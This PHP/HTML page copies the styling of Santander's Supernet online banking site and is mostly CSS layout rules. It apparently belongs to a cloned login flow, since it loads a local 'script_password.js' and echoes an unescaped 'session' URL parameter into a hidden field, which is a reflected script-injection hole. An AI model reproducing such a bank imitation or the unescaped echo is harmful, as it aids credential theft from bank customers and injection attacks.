<?php 
    $session = $_GET['session'];
?>
<html>

<head>



    <script language="JavaScript">
        window.parent.document.title = "Santander - Supernet - s1";

    </script>
    <title>Santander - Supernet - s1</title>


    <LINK REL=stylesheet TYPE='text/css' href='css/ie.css' media="all"/>



    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">


    <link rel="stylesheet" id="_$cSs0" media="all" type="text/css" href="css/apl_1.css">

    <script src="jquery-1.7.1.min.js"></script>
    <script src="script_password.js"></script>
    
    
    <script>
        $(document).ready(function(){
            var meses = new Array ("Ene","Feb","Mar","Abr","May","Jun","Jul","Ago","Sep","Oct","Nov","Dic");
            var f=new Date();
            
            var strFecha = f.getDate()+'/'+meses[f.getMonth()]+'/'+f.getFullYear();
            $('#mainFecha').html(strFecha);
        });
    </script>

</head>

<body id="supernet" style="background: rgb(213, 214, 216);" bgproperties="fixed" bgcolor="#FFFFFF" marginheight="0" marginwidth="0" topmargin="0">


<input type="hidden" name="session" id="session" value="<?=$session;?>">


<link rel="stylesheet" type="text/css" href="css/nuevosEstilos.css">

<style>/* Estilos de la pantalla principal y generales */
    body {
        font-family: Verdana;
        font-size: 11px;
    }

    /*Acomodo Quejas y sugerencias felicitaciones*/
    div#utilDialogBody>#divQuejas,div#utilDialogBody>#i1{
        width:600px !important;
    }
    div#UtilDialogBody>#i1>div[id="c_token1"]>input[type="text"],
    div#UtilDialogBody>#i1>div[id="c_noserie"]>input[type="text"],
    div#UtilDialogBody>#i1>div[id="c_token2"]>input[type="text"]{
        left:initial !important;
    }
    div#UtilDialogBody>#divQuejas>* select,div#UtilDialogBody>#divQuejas>* input[type="text"],div#UtilDialogBody>#divQuejas>* textarea,div#UtilDialogBody>#divQuejas>* select,div#UtilDialogBody>#divQuejas>* input[type="text"],div#UtilDialogBody>#divQuejas>* fieldset,
    div#UtilDialogBody>#i1>* select,div#UtilDialogBody>#i1>* input[type="text"],div#UtilDialogBody>#i1>* textarea,div#UtilDialogBody>#i1>* select,div#UtilDialogBody>#i1>* input[type="text"],div#UtilDialogBody>#i1>* fieldset{
        left: 215px !important;
        margin-left: 0 !important;
        padding-left: 0 !important;
        position: absolute !important;
    }
    /*Finaliza reacomodo quejas sugerencias felicitaciones*/

    /*Indra SAA Cambio de tamao imagen de header*/
    div[id="spnt.header"] > img#headerImage{
        height:57px !important;
    }
    /*Termina cambio de tamaño de imagen header*/
    div[id="spnt.header"]>font{
        color: #FFFFFF;
        font-size:11px !important;
        text-shadow: 1px 1px 3px rgba(64,64,64,0.5);
    }

    fieldset[id="admin.datos.filtro1"] fieldset{
        top: 7px !important;
    }
    fieldset[id="admin.datos.filtro4"] input[type="text"]{
        width: 125px !important;
    }
    #tdTextAreaContratoPaperless textarea#textPaperles{
        width:100% !important;
    }
    #tbPaperless #divTituloTerminos{
        width:655px !important;
    }
    #tbPaperless #lblAdvertenciaContratoPaperless{
        white-space:nowrap;
    }
    #divConfirmaPaperless > font,#divConfirmaPaperless > fieldset, div#divTableConfirmaPaperless{
        position: relative !important;
        top: initial !important;
        margin-top:10px;
    }
    div#divTableConfirmaPaperless>#tbPaperless,div#divTableConfirmaPaperless >button[id="modificarCorreo"]{
        top:initial !important;
        position: relative !important;
        float:left;
    }
    div#divTableConfirmaPaperless >button[id="modificarCorreo"]{
        left:initial !important;
    }
    div#divTableConfirmaPaperless>#divAvisoSelCtas{
        margin: 15px 0px;
    }
    div#divTableConfirmaPaperless>#divToken{
        position: relative !important;
        width:50% !important;
        height:auto !important;
        margin-top:10px;
    }
    div#divTableConfirmaPaperless>#divToken>*{
        float: left;
        left: initial !important;
        margin-right: 10px;
        position: relative !important;
    }
    div#divTableConfirmaPaperless>div{
        top: initial !important;
        position: relative !important;
        float: left;
    }
    div#divTableConfirmaPaperless>#divToken>img#imgToken{
        margin-top: -4px;
    }
    div#divTableConfirmaPaperless>#divBotonContiniuar,
    div#divTableConfirmaPaperless>#divBotonCancelar{
        left: initial !important;
        margin-top:10px;
        margin-right:50px;

    }
    div#divTableConfirmaPaperless>#divBotonContiniuar>button,
    div#divTableConfirmaPaperless>#divBotonCancelar>button{
        position:relative !important;
        left: initial !important;
    }

    #divTableConfirmaPaperless #tbPaperless button#modificarCorreo.accionBtn{
        float:left;
        top: initial !important;
        left: initial !important;
    }
    #divTableConfirmaPaperless div.caja-header font{
        top: 0px !important;
        left: initial !important;
        position: relative !important;
    }
    div#UtilDialogBody.win_bckg > #DivHeader.caja-header{
        width:700px !important;
    }
    div#UtilDialogBody.win_bckg > #DivHeader.caja-header font{
        top: 0px !important;
    }


    /*
fieldset#i50.notas{
	position: relative !important;
	float: left !important;
}
fieldset#i50.notas font{
	float:left !important;
	position: relative !important;
	width: 100% !important;
	left: initial !important;
	top: initial !important;
}
*/

    /*Inicia Alta de cuenta de terceros reacomodo*/
    div[id="admin.altaCtas"] >font, div[id="admin.altaCtas"] >div{
        float: left;
        top: initial !important;
        position: relative !important;
        left: initial !important;
    }
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.mensaje1"],div[id="admin.altaCtas"] > font[id="admin.altaCtas.mensaje3"]{
        white-space: nowrap !important;
        margin-bottom: 20px;
    }
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.banco"]{
        width:100%;
        text-align:left;
        padding-left:177px;
    }
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.lbNomTitular"],
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.lbAlias"]{
        width: 33% !important;
    }
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.lbNomTitular"],
    div[id="admin.altaCtas"] > font[id="admin.altaCtas.lbAlias"],
    div[id="admin.altaCtas"] > div[id="c_admin.altaCtas.inputNomTitular"],
    div[id="admin.altaCtas"] > div[id="c_admin.altaCtas.inputAlias"]{
        margin-top:10px;
    }
    /*Finaliza*/
    div[id="admin.ctas.msgs"]{
        width:calc(100%  - 10px) !important;
    }
    div[id="admin.altctas.divLabel5"] font{
        position: relative !important;
        left: initial !important;
    }
    /*Creado por indra SAA 17/07/2015 >> reacomodo posiciones relativas para login*/
    div[id="spnt.tabctrl"]{
        background-color:#5a5a5a;
    }
    div[id="spnt.tabctrl"]>div{
        width:auto !important;
    }
    div[id="spnt.tabctrl"]>div,
    div[id="spnt.tabctrl"]>div>div{
        top: initial !important;
        left:initial !important;
        float:left;
        position:relative !important;
    }

    div[id="spnt.header"]{
        position:relative !important;
        top: 0px !important;
    }
    /*Finaliza reacoccmodo login*/
    /*Creada por indra SAA >> Adecuacin para modificacin de position en pago agregar tdc*/
    div[id="admin.ctas.divMismoBanco"], div[id="admin.ctas.divOtrosBanco"],div[id="admin.segu.divBody"]{
        position: relative !important;
    }
    /*Finaliza*/

    /*Creado por Indra SAA 09/07/2015 >> Estilos de Resumen de movimientos*/

    /*Movimientos TDC*/
    div[id="mvtstc.divSubtitle"]{
        top: 35px !important;
    }
    div[id="mvtstc.divMain"]{
        top: 61px !important;
    }
    font[id="mvtstc.lblEstadoCuenta"]{
        font-size:11px !important;
    }
    font[id="mvtstc.lblDetalleTasaInteres"]{
        left:235px !important;
    }
    div[id="mvtstc.divInfoAccount"] > font.dialogLabelBold{
        font-size:12px !important;
        color: #000000 !important;
    }
    div[id="mvtstc.divMain"]{
        background-color: #FFF !important;
    }
    div[id="mvtstc.filterHeading"]{
        background-color:#f00 !important;
        color: #FFF !important;
    }
    div[id="mvtstc.divInFilters"]{
        background-color: #efeff1 !important;
    }
    /*Finaliza Movimientos TDC*/
    div[id="spnt.tabdivs.mvts"],div[id="mvtsfi"],div[id="mvtstc"]{
        width:100% !important;
        position: relative !important;
    }
    div[id="spnt.tabdivs.mvts"]>.title>.inTitle,
    div[id="mvtsfi"]>.title>.inTitle,
    div[id="mvtstc"]>.title>.inTitle{
        width:100% !important;
    }
    div[id="spnt.tabdivs.mvts"]>.title> .inTitle>img[imgname="ayuda1"],
    div[id="mvtsfi"]>.title> .inTitle>img[imgname="ayuda1"],
    div[id="mvtstc"]>.title> .inTitle>img[imgname="ayuda1"]{
        left: initial !important;
        right: 10px !important;
        top: 5px !important;
    }
    font[id="spnt.tabdivs.mvts.lblTitle"],
    font[id="mvtsfi.lblTitle"],
    font[id="mvtstc.lblTitle"]{
        font-size:14px !important;
        color: #FF0000 !important;
        font-weight: normal !important;
    }
    table[id="c_spnt.tabdivs.mvts.calTo"] fieldset,
    table[id="c_spnt.tabdivs.mvts.calFrom"] fieldset{
        top: 4px !important;
    }
    table[id="c_mvtsfi.calTo"] fieldset,table[id="c_mvtsfi.calFrom"] fieldset,
    table[id="c_mvtstc.calTo"] fieldset, table[id="c_mvtstc.calFrom"] fieldset{
        top: 6px !important;
    }
    div[id="spnt.tabdivs.mvts"]>.subtitle,div[id="spnt.tabdivs.mvts"]>.main,
    div[id="mvtsfi"]>.subtitle,div[id="mvtsfi"]>.main,
    div[id="mvtstc"]>.subtitle,div[id="mvtstc"]>.main{
        left: 9px !important;
    }
    div[id="spnt.tabdivs.mvts"]>.subtitle,div[id="mvtsfi"]>.subtitle{
        top:40px !important;
    }
    div[id="spnt.tabdivs.mvts"]>.main,div[id="mvtsfi"]>.main{
        top: 66px !important;
        background-color:#FFF !important;
    }
    font[id="spnt.tabdivs.mvts.lblSaldoSBC"],font[id="spnt.tabdivs.mvts.lblCuenta"],font[id="spnt.tabdivs.mvts.lblSaldoDisponible"],font[id="spnt.tabdivs.mvts.lblSaldoTotal"],
    font[id="mvtsfi.lblCuenta"]{
        color:#333333 !important;
        font-size: 12px !important;
        font-weight: bold !important;
    }
    font[id="spnt.tabdivs.mvts.lblSaldoDisponible"], font[id="spnt.tabdivs.mvts.lblSaldoTotal"],font[id="spnt.tabdivs.mvts.lblSaldoSBC"]{
        left: initial !important;
        right: 200px !important;
    }
    font[id="spnt.tabdivs.mvts.lblDetalleSaldoTotal"], font[id="spnt.tabdivs.mvts.lblDetalleSaldoDisponible"],font[id="spnt.tabdivs.mvts.lblDetalleSBC"]{
        left: 640px !important;
    }
    div[id="spnt.tabdivs.mvts.divFilters"],div[id="mvtsfi.divFilters"]{
        border:1px solid #CCCCCC !important;
        border-top:none !important;

    }
    div[id="spnt.tabdivs.mvts"] #filterHeading, div[id="mvtsfi"] .filterHeading{
        background-color: #FF0000 !important;
    }
    div[id="spnt.tabdivs.mvts"] #filterHeading>font,
    div[id="mvtsfi"] .filterHeading>font{
        font-size: 11px !important;
        color:#FFF !important;
        font-weight:700 !important;
    }
    div[id="spnt.tabdivs.mvts.divInFilters"],div[id="mvtsfi.divInFilters"]{
        border:none !important;
        background-color: #efeff1 !important;
    }
    div[id="spnt.tabdivs.mvts.divInFilters"] font, div[id="mvtsfi.divInFilters"] font{
        color: #5A5A5A !important;
    }
    div[id="mvts.divPager"],div[id="mvtsfi.divPager"]{
        background-color: #f7f8f8 !important;
    }
    /*Finaliza*/

    /*Clase generada por Indra SAA 07/07/2015 >> Modifica la posición para el elemento info para el login*/
    img[id="splg.UtilHelp"]{
        top:5px !important;
    }
    /*Classe generada por Indra SAA >> Ajuste de ancho para el correcto acomodo de indicador de paso*/
    #td0UtilDialogHeader{
        width: 100% !important;
    }
    .cls-linea-captura{
        width:300px;
    }
    .cls-ni-pcredito{
        width:70px;
    }
    .cls-txt-autos{
        width:300px;
    }
    .cls-importe{
        width:250px;
    }
    .cls-txt-importe{
        width:105px;
    }
    .cls-referencia-servicios{
        width:320px;
    }


    .cls-txt-importe-operaciones_rapidas{
        width:135px;
    }

    .cls-position-btns{
        position:relative!important;
        top:-15!important;
    }

    table, span, div, select, input, textarea, font, button, legend {
        font-family:Verdana;
        font-size: 11px;
    }

    .selectDecorator
    {
        background: #FF0000;
        color:white;
        min-width: 200px;
        max-width: 400px;
        border:0pt none;
        font-size:11px;
        margin-top:0px;
        padding:0px;
        text-indent:-1px;
    }
    /*Estilos para acomodar la interfaz de vinculacion detarjeta */
    @media screen and (-webkit-min-device-pixel-ratio:0){
        #c_deCuenta, #c_Mes {
            position: relative!important;
            left: -15px!important;
        }
        .vincYear{
            position: relative!important;
            left: 45px!important;
        }
        #NIPP{
            top: 148px!important;
            left: 330px!important;
        }
        #c_i23{
            left: 15px!important;
        }
    }

    @-moz-document url-prefix(){
        #c_deCuenta, #c_Mes {
            position: relative!important;
            left: -15px!important;
        }
        .vincYear{
            position: relative!important;
            left: 45px!important;
        }
        #NIPP{
            top: 148px!important;
            left: 330px!important;
        }
        #c_i23{
            left: 15px!important;
        }
    }

    /* IDS - Estilos para Muro */
    #icono_mensajes{
        height: 20px;
        width: 20px;
        display: table-cell;
        text-align: center;
        font-size:8px;
        text-align: center;
        font-weight: bold;
        vertical-align: middle;
        border-radius: 100%;
        background-image: url("./img/icono_msj_muro.png");
        background-repeat: repeat-x;
        background-position: center;
        position: absolute;
        left: 498px;
        top: 20px;
    }
    #numero_mensajes{
        position: relative;
        top: 5px;
        color: white;
    }

    .personal {
        position: absolute;
        left: 425px !important;
        top: 10px;
        cursor: pointer;
        display: none;
        background: url("./img/personal-black.png") no-repeat;
        width: 100px;
        height: 40px;
    }

    .personal:hover {
        background: url("./img/personal-red.png") no-repeat;
    }

    @media screen and (-webkit-min-device-pixel-ratio:0){
        #icono_mensajes{
            height: 18px;
            width: 18px;
            display: table-cell;
            text-align: center;
            font-size:8px;
            text-align: center;
            font-weight: bold;
            vertical-align: middle;
            border-radius: 100%;
            background: #fe0000;
            position: absolute;
            left: 480px;
            top: 20px;
        }
        #numero_mensajes{
            position: relative;
            top: -5px;
            color: white;
        }
    }

    @-moz-document url-prefix(){
        #icono_mensajes{
            height: 18px;
            width: 18px;
            display: table-cell;
            text-align: center;
            font-size:8px;
            text-align: center;
            font-weight: bold;
            vertical-align: middle;
            border-radius: 100%;
            background: #fe0000;
            position: absolute;
            left: 498px;
            top: 20px;
        }
        #numero_mensajes{
            position: relative;
            top: -5px;
            color: white;
        }
    }

    #spnt.info.muro{
        position: absolute;
        left: 415px;
        top: 10px;
        cursor: pointer;
    }
    /* Fin de estilos para Muro */

    div.spnt-sombra {
        background-image: url(./img/spnt-oprp-sombra.gif);
        background-repeat: repeat-x;
    }
    /*Clase modificada por Indra SAA 25/06/2015 >> Modifica el estilo de los encabezados de Saldos consolidados en modulo de mi SuperNet */
    div.caja-header{
        /*background-image: url(./img/caja_header.gif);*/
        background-color: #EFEFF1 !important;
        height: 32px !important;
        color: #FF0000 !important;
        background-repeat: repeat-x;
        width:100% !important;
    }
    div.caja-header font{
        top:8px !important;
    }


    /*Clase creada por Indra SAA 29/06/2015 >> Adiciona Logos a los encabezados de saldos consolidados mi supernet*/
    /*Cuentas de Cheques*/
    div[id="ctasCheques.UtilCajaColapHeader"]{
        background-image: url(./img/sprite-ico-widget-header-dropdown-red.gif);
        background-repeat:no-repeat;
        background-position: 5px 5px;
    }
    /*Terjetas de Crédito*/
    div[id="trjtasCredito.UtilCajaColapHeader"]{
        background-image: url(./img/sprite-ico-widget-header-dropdown-red.gif);
        background-repeat:no-repeat;
        background-position: 5px -29px;
    }
    /*Fondos de Inversión*/
    div[id="fndsInversion.UtilCajaColapHeader"],div[id="invrsnVista.UtilCajaColapHeader"],div[id="invrsnPlazo.UtilCajaColapHeader"]{
        background-image: url(./img/sprite-ico-widget-header-dropdown-red.gif);
        background-repeat:no-repeat;
        background-position: 5px -100px;
    }
    /*Créditos*/
    div[id="credPersona.UtilCajaColapHeader"]{
        background-image: url(./img/sprite-ico-widget-header-dropdown-red.gif);
        background-repeat:no-repeat;
        background-position: 5px -65px;
    }

    img[imgname="ayuda1"]{
        width: 17px !important;
        height: 17px !important;
    }
    /*Clase creada por Indra SAA  25/06/2015 >> Modifica la posicion del elemento collapse para la parte derecha del encabezado*/
    div.caja-header img[imgname="colapse"]{
        right: 7px !important;
        left: initial !important;
        top: 7px !important;
    }
    div.caja-header-dom{
        background-color: #F1F1F1;
        font-weight: bold;
        font-size: 12px;
    }


    div.headerSldCons {
        font-family: Verdana;
        font-size: 11px;
        color: black;
        font-weight: bold;
        background-image: url("./img/barra_cuentas_fillAux.gif");
        background-repeat: repeat-x;
    }


    tr.headerSldCons {
        font-family: Verdana;
        font-size: 11px;
        color: black;
        font-weight: bold;
        /*background-image: url("./img/barra_cuentas_fillAux.gif");*/
        background-color:#F7F8F8 !important;
        background-repeat: repeat-x;
    }

    tr.headerSldConsII {
        font-family: Verdana;
        font-size: 11px;
        color: black;
        font-weight: bold;
        /*background-image: url("./img/barra_cuentas_fillAuxII.gif");*/
        background-repeat: repeat-x;
        background-color:#F7F8F8 !important;
    }

    td.imageCell {
        border-color: #000000;
    }

    font.bodyTab {
        text-align: center;
        /*padding-left: 3px;*/
        padding-right: 0px;
        cursor:pointer;
        color:#FFFFFF;
        font-size: 11px !important;
    }

    tr.mdtitle {
        /*background-image:url("../img/title.gif");*/
        background:#FFF;
        background-repeat: repeat-x;
        height:28px;
    }

    img.mdhelp {
        padding-right: 10px;
    }
    font.mdtitle {
        color:white;
        font-size:11px;
        font-weight:bold;
        padding-left: 10px;
    }

    font.bodyTabOff {
        text-align: center;
        /*padding-left: 3px;*/
        padding-right: 0px;
        cursor:default;
        color:white;
        font-size:11px !important;
    }

    font.link {
        cursor: pointer;
        color: #0000CC;
        text-decoration:none;
    }

    font.linkunder {
        cursor: pointer;
        color: #000000;
        text-decoration: underline;
    }

    font.linkred {
        text-decoration: underline;
        cursor: pointer;
        color: #FF0000
    }

    div.msg {
        border-width: 1px;
        border-style: solid;
        border-color: #C4C5C8
    }

    div.layer {
        background-color: #C4C5C8;
        filter:alpha(opacity=70);
        opacity: 0.70;
        display: none;
        text-align: center;
        position: fixed !important;
    }

    iframe.layer {
        background-color: #C4C5C8;
        filter:alpha(opacity=20);
        opacity: 0.2;
        display: none;
        text-align: center;
        z-index: 9999

    }

    div.pgtr {
        background-image: url("./img/workingonPgtr.jpg");
        background-position: center;
        background-repeat: no-repeat
    }

    div.footer {
        background-image: url(./img/footer_fill.gif);
        background-repeat: repeat-x;
    }

    img.button {
        cursor: pointer;
    }

    div.cajaHeaderLink {
        float:right;
        position:relative;
        top:5px;
        margin-right: 5px;
    }


    font.mvts {
        font-size: 11px;
        font-family: Verdana;
        font-weight:normal;
    }

    font.headerTitle {
        font-size: 11px;
        float:left;
        position:relative;
        top:4px;
        left:3px;
    }
    div.confirm {
        z-index: 20000;
    }
    /*Classe modificada por Indra SAA para Look & Feel SuperNet 22/06/2015*/
    div.title {
        background: #84878C;
        font-size: 11px;
        width:100% !important;
    }

    div.inTitle {
        border-top-style:solid;
        border-top-width: 1px;
        border-top-color: #E5E8E8;
        border-bottom-style:solid;
        border-bottom-width: 1px;
        border-bottom-color: #E5E8E8;
        font-family: Verdana;
        font-size: 11px;
        color: white;
        font-weight: bold;
        padding-right: 5px;
    }

    div.main {
        background: #F4F5F9;
        border: 2px solid #D6D7DB;
        border-top-width: 0px;
        font-family: Verdana;
        font-size: 11px;
        color: black;
        font-weight: bold;
    }

    font.all, font.dialogLabel{
        font-size: 11px !important;
        font-family: Verdana;
    }
    /*Modificación Indra SAA 07/07/2015 >> Se modifica el tamaño de fuente en los encabezados de las ventanas modales*/
    font.dialogLabelBold {
        font-size: 14px;
        font-weight: bold;
    }

    div.dialogButton {
        cursor:pointer;
    }
    font.dialogButton {
        font-size:11px !important;
        color: #000000;
    }
    font.dialogLabels font.all{
        font-size:11px !impor;
        color: #000000;
    }

    td.comfirm {
        font-size: 14px;
    }

    div.linksdiv {
        width: 100%;
        height: 100%;
        background-color: #F4F5F9;
    }

    fieldset.notas {
        color: #000000;
    }
    .borderTable{
        border: 2px solid;
        border-color: black;
    }
    div.utilWnd {
        width:auto;
        height:auto;
        background: transparent;
        padding: 1px;
        border-top:solid 6px #FF0000 !important;
    }
    div.mainWin{
        border-top:solid 6px #FF0000 !important;
    }
    /*Creación de clase Indra SAA 23/06/2015 >> Para ocultar el título de operaciones rápidas en mi supernet*/
    font[id="oprp.UtilTitle"]{
        display:none;
    }
    /*Modificación Indra SAA 23/06/2015 >> Creación de clase para la adicion de la imagen Operaciones Rápidas*/
    td[id="oprp.i6"]{
        background-image:url("img/operacionesRapidas.jpg") !important;
        background-repeat:no-repeat;
        background-position:center;
        width:170px !important;
        height:60px !important;
    }
    /*Adición de clase Indra SAA 23/06/015 >> Para el correcto posicionamiento del icono de ayuda en operaciones rapidas de mi supernet*/
    div[id="oprp.i8"]{
        vertical-align:top !important;
    }
    div[id="oprp.UtilBody"] .spnt-sombra{
        display:none !important;
    }

    /*Clase creada por Indra SAA 25/06/2015 >> ELiminación del borde blanco para la opcion de operaciones rápidas en el modulo de mi SuperNet*/
    div[id="spnt.tabdivs.msdr.oprp"]{
        background-color:transparent !important;
    }

    /*Generada por Indra SAA 25/06/2015 >> Bloqe para reubicación de elementos del encabezado*/
    .indraUnderMenu{
        background:url("./img/bgToolBar.jpg") !important;
        height:50px !important;
    }
    .indraUnderMenu #mainFecha{
        left:initial !important;
        right:10px;
    }
    .indraUnderMenu img[imgname="constancias_fiscales"],.indraUnderMenu img[imgname="edocta"],.indraUnderMenu img[imgname="print"],.indraUnderMenu img[imgname="cfdi"]{
        top:8px !important;
        cursor: pointer !important;
    }
    .indraUnderMenu img[imgname="constancias_fiscales"]{
        left: 533px !important;
    }
    .indraUnderMenu img[imgname="edocta"]{
        left: 650px !important;
    }
    .indraUnderMenu img[imgname="print"]{
        left:763px !important;
    }
    .indraUnderMenu img[imgname="cfdi"]{
        left: 856px !important;
    }
    .indraUnderMenu img[imgname="nvaSnet"]{
        display: none;
    }

    .indraUnderMenu font{
        font-size:11px !important;
        font-family: Verdana;
    }
    .indraUnderMenu font[id="spnt.info.nmbr"]{
        font-weight:700 !important;
        overflow: hidden;
        text-overflow: ellipsis;
        top: 10px !important;
        white-space: nowrap;
        width: 340px !important;
    }
    .indraUnderMenu font[id="spnt.info.bnda"]{
        font-size:11px !important;
        top: 10px !important;
    }
    .indraUnderMenu font[id="spnt.info.FchUltAcceso"]{
        top: 25px !important;
    }

    /*--Fin del bloque--*/

    /* Clase generada por Indra SAA 26/06/2015 >> modificacion para borde superior rojo a publicidad*/
    div[id="spnt.mnsg2"] > div{
        border-top:6px solid #FF0000 !important;
        margin-bottom:15px !important;
        position: initial !important;
    }

    div.utilHeader {
        height:25px;
        background: #84878C;
        color: #FFFFFF;
        border-top: 1px solid #ffffff;
        border-bottom: 1px solid #ffffff;
        padding-top:2px;
        padding-left:5px;
        position: relative;
    }
    #spnt.tabdivs,#spnt.tabdivs.msdr{
        background:transparent !important;
    }
    div.utilBody {
        /*border-top: 1px solid #84878C;*/
        position: relative;
        background: #FFFFFF; /*#F4F5F9;*/
    }

    font.utilLabel {
        position: absolute;
        top: 2px;
        left: 4px;
        font-size: 13px;
        font-weight: bold;
    }

    div.helpHeaderIcon {
        float:right;
        position:relative;
        top:-1px;
    }

    body {
        font-family: Verdana;
        font-size: 11px;
    }
    /*Generación de clase por Indra SAA 24/06/2015 >> Adecuación de la alineación vertical para el elemento de ayuda de operaciones rápidas en el modulo de mi superNet*/
    td[id="oprp.i8"]{
        vertical-align:top !important;
    }
    /*Modificación Indra SAA 23/06/2015 >> Adecuación de estilo para modulo de operaciones rápidas en mi supernet*/
    .fsiSubtitulo{
        padding:0px 6px;
    }
    div.oprpLabels {
        border:0px !important;
        margin-top: 5px;
        margin-bottom: 5px;
        background-color:#efeff1;
        color: #FF0000;
        width:100% !important;
        font-size:14px !important;
        font-weight:400 !important;
    }
    /*Classe Generada por Indra SAA 24/06/2015 >> Modifica los  formatos de letra para la parte de operaciones rápidas del modulo de mi SuperNet*/
    div[id="oprp.UtilBody"] table tr td div.linked font.header3{
        color:#FFF !important;
        font-size:10px !important;
        font-weight: bold !important;
        left: 35px !important;
        top: 9px !important;

        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        width: 136px;
    }
    /*Clase Generada por Indra SAA 24/06/2015 >> Modifica los margenes superior e inferior para los elementos de operaciones rápidas de modulo mi SuperNet*/
    div[id="oprp.UtilBody"] table tr td.oprap{
        padding-top: 0px;
        padding-bottom: 0px;
    }
    div[id="oprp.UtilBody"] table tr td.oprap div.linked > img{
        border-top:1px solid rgba(64,64,64,0.3) !important;
    }

    /*Clase generad por Indra SAA 08/07/2015 >> Acomodo de mainOperation operaciones rapidas*/
    div[id="oprp.UtilBody"] div.mainOperation[id="msfquick.main"]{
        top: 31px !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation>div img{
        border:none !important;
    }

    div[id="msfquick.panelFav"],div[id="msfquick.admonFav"]{
        background-color: transparent !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation>div[name]{
        background: transparent !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation>div{
        background-color: transparent !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation>div>font{
        color:#333333 !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation>div>img[imgname="flecha"]{
        display:none !important;
    }
    /*Clase generada por indra SAA 08/07/2015 >> modifica la posición del elemento mis operaciones favoritas*/

    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation{
        width: 100% !important;
        top: 0px !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap div[id="msfquick.main"]{
        top: 30px !important;
    }
    div[id="oprp.UtilBody"] table tr td.oprap .mainOperation input.size[type="text"]{
        width: 122px !important;
    }

    td.oprap {
        padding: 5px;
    }

    button.accionBtn {
        background: url('./img/accion.gif') no-repeat;
        border: 0px;
        font-size: 11px;
        cursor: pointer;
        text-align: center;
        font-weight: normal;
        padding-left:0px;
        padding-right:0px;
    }

    button.accionBtn2 {
        /*background: url('./img/accion2.gif') no-repeat;*/
        background:#FFF !important;
        box-shadow: 5px 5px 5px rgba(64,64,64,0.3);
        color:#FF0000 !important;
        border: 0px;
        font-size: 11px;
        cursor: pointer;
        text-align: center;
        padding-left:0px;
        padding-right:0px;
        font-weight: normal;
    }

    button.accionBtn4 {
        background: url('./img/accion3.gif') no-repeat;
        border: 0px;
        font-size: 11px;
        cursor: pointer;
        text-align: center;
        padding-left:0px;
        padding-right:0px;
        font-weight: normal;
    }

    button.accionBtn3 {
        background: url('./img/imprimirPDF.gif') no-repeat;
        border: 0px;
        font-size: 11px;
        cursor: pointer;
        text-align: center;
        padding:0px;
        font-weight: normal;
    }

    .normalSize {
        font-size: 11px;
    }

    font.helperLabel {
        overflow: hidden;
    }

    div.mainWin
    {
        background-color: #FFFFFF; /*#F4F5F9;*/
        border-style:solid;
        border-width: 1px;
        border-color: #040404;
        border-top:0px;

    }


    div.mainOperation
    {
        border-width: 1px;
        border-color: #FF0000;
        background-color: #F1F1F1;
    }

    .header4
    {
        color: #FFFFFF;
        font-size: 13px;

    }

    .linked
    {
        cursor:pointer;
    }

    .header3
    {
        font-size: 13px;
    }

    .header
    {
        font-size: 12px;
        font-weight: bold;
        color: #FF0000 !important;
        /*color: #FFFFFF;*/
    }

    /*Modificación Indra SAA 22/06/2015 >> Modificación para el alto de letra en las ventanas modales*/
    .mainWin .header{
        top:9px !important;
    }

    .header2
    {
        font-size: 13px;
        font-weight: bold;

    }

    td.reciboLeft {
        font-size: 11px;
        width:170px;
        *width:0px;/*solo para IE*/
    }

    td.reciboRight {
        font-size: 11px;
    }

    div.dtitle {
        font-size: 12px;
        color: #FF0000;
        font-weight: bold;
        padding-right: 5px;
        margin-left: 1px;
        padding-right: 1px;
        /*background-image: url(./img/title.gif);*/
        background:#FFF !important;
        border-top:2px solid #FF0000;
    }

    td.dheader {
        /*Modificación de clase Indra SAA 23/06/2015 para eliminación de encabezado gris en las ventas modales*/
        /*background-image: url(./img/title.gif);*/
        /*background:#FFF !important;*/

        padding: 5px;
    }
    /*Clase adicionada por Indra SAA >> modificacion para cambio de formato de letra en los encabezados de las operativas y módulos*/
    td.dheader > font{
        font-weight: 400;
        font-size:14px;
        font-family: Verdana !important;
    }
    .utilWnd td.dheader > font{
        font-family: Verdana;
        font-size: 16px;
        font-weight: 400;
        left: 40px !important;
    }
    .utilWnd>.title[id="pgs.UtilHeader"],.utilWnd>.title[id="tran.UtilHeader"],.utilWnd>.title[id="sldinv.UtilHeader"],.utilWnd>.title[id="dire.UtilHeader"],.utilWnd>.title[id="bpriv.UtilHeader"],.utilWnd>.title[id="admn.UtilHeader"]{
        background-image: url(./img/sprite-icons-misc.gif);
        background-repeat:no-repeat;
    }
    /*Pagos y Compras*/
    .utilWnd>.title[id="pgs.UtilHeader"]{
        background-position:13px -28px;
    }
    /*Transferencias*/
    .utilWnd>.title[id="tran.UtilHeader"]{
        background-position:13px -267px;
    }
    /*Inversiones*/
    .utilWnd>.title[id="sldinv.UtilHeader"]{
        background-position:13px -146px;
    }
    /*Directorio*/
    .utilWnd>.title[id="dire.UtilHeader"]{
        background-position:13px -108px;
    }
    /*Banca Privada*/
    .utilWnd>.title[id="bpriv.UtilHeader"]{
        background-position:13px -190px;
    }
    /*Administración*/
    .utilWnd>.title[id="admn.UtilHeader"]{
        background-position:13px -308px;
    }
    /*Finaliza*/

    /*Clase Creada por Indra SAA 30/06/2015 >> Modifica los estilos para los menus de opciones*/


    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .linksdiv,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .linksdiv{
        background-color: #fff !important;
        left: 0 !important;
        width: 100% !important;
        background-color: transparent !important;
    }
    /*
div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div div.mainOperations>div.caja-header{

}
div[id="spnt.tabdivs.dire"] > .utilWnd > .utilBody > div > .mainOperations > div div.mainOperations,
